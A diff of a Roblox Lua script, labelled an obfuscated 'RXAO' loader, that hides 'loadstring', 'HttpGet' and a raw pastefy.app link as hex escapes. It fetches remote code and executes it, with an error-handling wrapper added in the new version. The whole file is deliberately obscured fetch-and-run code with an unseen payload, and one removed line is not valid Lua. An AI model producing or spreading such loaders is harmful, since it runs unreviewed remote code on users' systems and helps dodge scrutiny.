@@ -1,11 +1,22 @@
---// RXAO FULLY OBFUSCATED HIDDEN STRING LOADER
-local _ilIIllIii = {
-    [1] = "\x6c\x6f\x61\x64\x73\x74\x72\x69\x6e\x67", -- loadstring
-    [2] = "\x67\x61\x6d\x65\x3a\x48\x74\x74\x70\x47\x65\x74", -- game:HttpGet
-    [3] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70\x2f\x46\x4a\x68\x79\x51\x48\x44\x32\x2f\x72\x61\x77" -- pastefy raw link
+--// RXAO STABLE OBFUSCATED LOADER
+local _data = {
+    ["loader"] = "\x6c\x6f\x61\x64\x73\x74\x72\x69\x6e\x67",
+    ["url"] = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70\x2f\x46\x4a\x68\x79\x51\x48\x44\x32\x2f\x72\x61\x77"
 }
 
-local _runtime = getfenv()[_ilIIllIii[1]]
-local _fetcher = getfenv()[_ilIIllIii[2]] or game:GetService("\x48\x74\x74\x70\x53\x65\x72\x76\x69\x63\x65").\x47\x65\x74\x41\x73\x79\x6e\x63
+-- Decode logic
+local _func = getfenv()[_data["loader"]]
+local _raw = game:HttpGet(_data["url"], true)
 
-_runtime(_runtime(_fetcher(game, _ilIIllIii[3]))())()
+-- Final Execution
+if _raw and _raw ~= "" then
+    local _success, _result = pcall(function()
+        return _func(_raw)()
+    end)
+    
+    if not _success then
+        warn("[RxO Error]: " .. tostring(_result))
+    end
+else
+    warn("[RxO Error]: Connection/URL Failed")
+end
